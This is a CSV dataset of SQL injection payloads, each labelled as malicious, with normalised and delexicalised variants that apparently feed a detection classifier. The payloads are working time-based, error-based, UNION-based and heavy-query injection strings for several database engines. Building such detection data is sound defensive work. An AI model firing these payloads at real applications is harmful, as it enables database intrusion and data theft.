payload_raw,label,source,sqli_type_hint,is_obfuscated,payload_norm,payload_delex
"-5513""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""ovmk"" like ""ovmk",1,sqli_dataset.csv,,False,"-5513"" ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( ""ovmk"" like ""ovmk",-<NUM><STR>ovmk<STR>ovmk
waitfor delay '0:0:5' and    (    (   '%'  =  ',1,sqli_dataset.csv,,False,waitfor delay '0:0:5' and ( ( '%' = ',waitfor delay <STR> and ( ( <STR> = '
"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""dhss""  =  ""dhss",1,sqli_dataset.csv,,False,"1"" ) and make_set ( 8403 = 8403,8899 ) and ( ""dhss"" = ""dhss",<NUM><STR>dhss<STR>dhss
-3880  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  5194  =  5194,1,sqli_dataset.csv,,False,-3880 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 5194 = 5194,-<NUM> ) or <NUM> = ( select upper ( xmltype ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) from dual ) and ( <NUM> = <NUM>
1'+  (  select 'qxmo' where 9511  =  9511 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,sqli_dataset.csv,,True,1'+ ( select 'qxmo' where 9511 = 9511 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,<NUM><STR>qxmo' where <NUM> = <NUM> rlike ( select * from ( select ( sleep ( <NUM> ) ) ) vwyq ) #
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat",1,sqli_dataset.csv,,True,"1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'cuat' = 'cuat",<NUM><STR>cuat<STR>cuat
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe",1,sqli_dataset.csv,,False,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ""plqe"" = ""plqe","( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and <STR> = ""plqe"
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1%' ) ) ) union all select null,null,null,null,null,null,null,null--","<NUM>%' ) ) ) union all select null,null,null,null,null,null,null,null--"
"1'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sqli_dataset.csv,,False,"1' ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>' ) ) ) or <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",1,sqli_dataset.csv,,True,"-7963'+ ( select 'kxzh' where 7039 = 7039 union all select 7039,7039,7039,7039,7039,7039--","-<NUM><STR>kxzh' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--"
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,sqli_dataset.csv,,False,"1"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )","<NUM>"" or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )"
"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",1,sqli_dataset.csv,,True,"-5516'+ ( select 'bmlv' where 7188 = 7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#","-<NUM><STR>bmlv' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
1 where 7055  =  7055,1,sqli_dataset.csv,,False,1 where 7055 = 7055,<NUM> where <NUM> = <NUM>
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,1,sqli_dataset.csv,,False,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = ""","call regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) and ( ( ( <STR> = """
"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",1,sqli_dataset.csv,,False,"-2626%' ) or elt ( 7513 = 8586,8586 ) and ( '%' = '",-<NUM>%<STR>%<STR>
"1'||  (  select 'iwlj' where 8704  =  8704 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1,sqli_dataset.csv,,True,"1'|| ( select 'iwlj' where 8704 = 8704 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) ) ||'",<NUM><STR>iwlj<STR>
"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'vkde'  =  'vkde",1,sqli_dataset.csv,,True,"1' ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( 'vkde' = 'vkde",<NUM><STR>vkde<STR>vkde
"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sqli_dataset.csv,,False,"1 ) as zbha where 9700 = 9700 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM> ) as zbha where <NUM> = <NUM> or <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --"
"1""  )   where 5938  =  5938 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,sqli_dataset.csv,,False,"1"" ) where 5938 = 5938 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #","<NUM>"" ) where <NUM> = <NUM> and ( select * from ( select ( sleep ( <NUM> ) ) ) gcrr ) #"
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,sqli_dataset.csv,,False,1 ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,<NUM> ) ) ) rlike ( select * from ( select ( sleep ( <NUM> ) ) ) vwyq ) #
"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj",1,sqli_dataset.csv,,False,"-3868' ) ) or make_set ( 6809 = 1236,1236 ) and ( ( 'evnj' = 'evnj",-<NUM><STR>evnj<STR>evnj
"-2365   )    )    union all select 8190,8190#",1,sqli_dataset.csv,,False,"-2365 ) ) union all select 8190,8190#","-<NUM> ) ) union all select <NUM>,<NUM>#"
-2039'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,sqli_dataset.csv,,True,-2039' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),-<NUM>' ) or <NUM> in ( ( char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) + ( select ( case when ( <NUM> = <NUM> ) then char ( <NUM> ) else char ( <NUM> ) end ) ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) +char ( <NUM> ) ) )
"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sqli_dataset.csv,,True,"1'+ ( select pwvr where 3028 = 3028 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM><STR>abcdefg',upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --"
1'  )   where 6440  =  6440 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sqli_dataset.csv,,False,1' ) where 6440 = 6440 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,<NUM>' ) where <NUM> = <NUM> or ( select * from ( select ( sleep ( <NUM> ) ) ) sddo ) #
"1""   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sqli_dataset.csv,,False,"1"" ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>"" ) ) and <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"1"" where 1115  =  1115 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sqli_dataset.csv,,False,"1"" where 1115 = 1115 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM>"" where <NUM> = <NUM> or <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --"
"1%"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """,1,sqli_dataset.csv,,True,"1%"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""%"" = """,<NUM>%<STR>%<STR>
"-3436  )   or elt  (  1032  =  1032,3623  )  ",1,sqli_dataset.csv,,False,"-3436 ) or elt ( 1032 = 1032,3623 )","-<NUM> ) or elt ( <NUM> = <NUM>,<NUM> )"
"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,sqli_dataset.csv,,False,"1' or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )","<NUM>' or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )"
"1%'  )   union all select null,null,null,null,null--",1,sqli_dataset.csv,,False,"1%' ) union all select null,null,null,null,null--","<NUM>%' ) union all select null,null,null,null,null--"
"1%'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1,sqli_dataset.csv,,False,"1%' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( '%' = '",<NUM>%<STR>abcdefg<STR>%<STR>
"1""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""qgle"" like ""qgle",1,sqli_dataset.csv,,True,"1"" ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ""qgle"" like ""qgle",<NUM><STR>qgle<STR>qgle
1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,1,sqli_dataset.csv,,False,1'|| ( select 'lxyu' from dual where 5789 = 5789 union all select null#,<NUM><STR>lxyu' from dual where <NUM> = <NUM> union all select null#
" select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",1,sqli_dataset.csv,,False,"select sleep ( 5 ) and ( ( ( ""zlal"" = ""zlal","select sleep ( <NUM> ) and ( ( ( <STR> = ""zlal"
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1%"" ) ) ) union all select null,null,null,null,null,null,null,null,null#","<NUM>%"" ) ) ) union all select null,null,null,null,null,null,null,null,null#"
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1,sqli_dataset.csv,,False,"1', ( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 7823 = 7823 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )","<NUM>', ( cast ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) ) ::text|| ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) as numeric ) )"
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""%""  =  """,1,sqli_dataset.csv,,False,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ""%"" = ""","select count ( * ) from generate_series ( <NUM>,<NUM> ) and ( ( <STR> = """
"1'||  (  select 'drna' from dual where 5082  =  5082 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",1,sqli_dataset.csv,,True,"1'|| ( select 'drna' from dual where 5082 = 5082 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) ||'",<NUM><STR>drna<STR>
"1%"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,1,sqli_dataset.csv,,False,"1%"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""%"" = """,<NUM>%<STR>%<STR>
"1 union all select null,null,null,null#",1,sqli_dataset.csv,,False,"1 union all select null,null,null,null#","<NUM> union all select null,null,null,null#"
"1%""  )   union all select null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1%"" ) union all select null,null,null,null,null,null,null,null#","<NUM>%"" ) union all select null,null,null,null,null,null,null,null#"
"-9356 or elt  (  1032  =  1032,3623  )  -- izgi",1,sqli_dataset.csv,,False,"-9356 or elt ( 1032 = 1032,3623 ) -- izgi","-<NUM> or elt ( <NUM> = <NUM>,<NUM> ) -- izgi"
1   )    )    order by 1#,1,sqli_dataset.csv,,False,1 ) ) order by 1#,<NUM> ) ) order by <NUM>#
"1'   )    )     )   union all select null,null,null,null,null,null,null,null--",1,sqli_dataset.csv,,False,"1' ) ) ) union all select null,null,null,null,null,null,null,null--","<NUM>' ) ) ) union all select null,null,null,null,null,null,null,null--"
"1""   )    )    as yosd where 1255  =  1255",1,sqli_dataset.csv,,False,"1"" ) ) as yosd where 1255 = 1255","<NUM>"" ) ) as yosd where <NUM> = <NUM>"
"1%""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1%"" ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","<NUM>%"" ) ) or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --"
"1""  )   as kslq where 8669  =  8669 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sqli_dataset.csv,,False,"1"" ) as kslq where 8669 = 8669 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>"" ) as kslq where <NUM> = <NUM> and <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --"
"1"" union all select null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1"" union all select null,null,null,null,null,null,null#","<NUM>"" union all select null,null,null,null,null,null,null#"
"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sqli_dataset.csv,,False,"1' ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #","<NUM>' ) ) ) and elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) #"
1  )   and 7533  =  7533 and   (  7175  =  7175,1,sqli_dataset.csv,,False,1 ) and 7533 = 7533 and ( 7175 = 7175,<NUM> ) and <NUM> = <NUM> and ( <NUM> = <NUM>
"1""   )    )    and 7533  =  7533 and    (    (   ""gkca""  =  ""gkca",1,sqli_dataset.csv,,False,"1"" ) ) and 7533 = 7533 and ( ( ""gkca"" = ""gkca",<NUM><STR>gkca<STR>gkca
"-4711%""   )    )    union all select 6737,6737,6737,6737#",1,sqli_dataset.csv,,False,"-4711%"" ) ) union all select 6737,6737,6737,6737#","-<NUM>%"" ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>#"
-7675%'   )    )     )   order by 1--,1,sqli_dataset.csv,,False,-7675%' ) ) ) order by 1--,-<NUM>%' ) ) ) order by <NUM>--
1'+  (  select goec where 9460  =  9460 rlike   (  select   (  case when   (  4740  =  1203  )   then 1 else 0x28 end   )    )     )  +',1,sqli_dataset.csv,,True,1'+ ( select goec where 9460 = 9460 rlike ( select ( case when ( 4740 = 1203 ) then 1 else 0x28 end ) ) ) +',<NUM><STR>
1'  )   where 3730  =  3730 and sleep  (  5  )  #,1,sqli_dataset.csv,,False,1' ) where 3730 = 3730 and sleep ( 5 ) #,<NUM>' ) where <NUM> = <NUM> and sleep ( <NUM> ) #
"1'+  (  select iaeu where 5509  =  5509 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sqli_dataset.csv,,True,"1'+ ( select iaeu where 5509 = 5509 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #","<NUM>'+ ( select iaeu where <NUM> = <NUM> or <NUM> = benchmark ( <NUM>,md5 ( 0x544d5a4c ) ) #"
"1'||  (  select 'bmyt' from dual where 9407  =  9407 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",1,sqli_dataset.csv,,False,"1'|| ( select 'bmyt' from dual where 9407 = 9407 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",<NUM><STR>bmyt<STR>abcdefg<STR>
"1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  --",1,sqli_dataset.csv,,False,"1 ) where 8671 = 8671 and make_set ( 4931 = 1642,1642 ) --","<NUM> ) where <NUM> = <NUM> and make_set ( <NUM> = <NUM>,<NUM> ) --"
-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,1,sqli_dataset.csv,,False,-3596 ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 3645 = 3645,-<NUM> ) ) ) or <NUM> = ( <STR>|| ( select case <NUM> when <NUM> then <NUM> else <NUM> end from rdb$database ) ||<STR> ) and ( ( ( <NUM> = <NUM>
-2431'  )   or 8571  =  8571--,1,sqli_dataset.csv,,False,-2431' ) or 8571 = 8571--,-<NUM>' ) or <NUM> = <NUM>--
"-8599   )    )    or elt  (  5628  =  2324,2324  )   and    (    (   1134  =  1134",1,sqli_dataset.csv,,False,"-8599 ) ) or elt ( 5628 = 2324,2324 ) and ( ( 1134 = 1134","-<NUM> ) ) or elt ( <NUM> = <NUM>,<NUM> ) and ( ( <NUM> = <NUM>"
"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",1,sqli_dataset.csv,,False,"1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )","<NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null )"
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'rkoe'  =  'rkoe",1,sqli_dataset.csv,,False,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( 'rkoe' = 'rkoe","select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( <STR> = 'rkoe"
"1'  )   as jxqt where 4322  =  4322 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sqli_dataset.csv,,False,"1' ) as jxqt where 4322 = 4322 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --","<NUM>' ) as jxqt where <NUM> = <NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( left ( crypt_key ( char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ,null ) ,<NUM> ) ,<NUM> ) ,null ) --"
"-8919"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""nstr""  =  ""nstr",1,sqli_dataset.csv,,False,"-8919"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""nstr"" = ""nstr",-<NUM><STR>nstr<STR>nstr
"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",1,sqli_dataset.csv,,False,"-9136%"" ) union all select 3081,3081,3081,3081,3081,3081,3081#","-<NUM>%"" ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#"
"1"" where 6325  =  6325 union all select null,null,null,null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1"" where 6325 = 6325 union all select null,null,null,null,null,null,null,null,null,null#","<NUM>"" where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null#"
"1%""   )    )    union all select null,null,null,null,null,null,null#",1,sqli_dataset.csv,,False,"1%"" ) ) union all select null,null,null,null,null,null,null#","<NUM>%"" ) ) union all select null,null,null,null,null,null,null#"
"1%"" and 2006  =  2006",1,sqli_dataset.csv,,False,"1%"" and 2006 = 2006","<NUM>%"" and <NUM> = <NUM>"
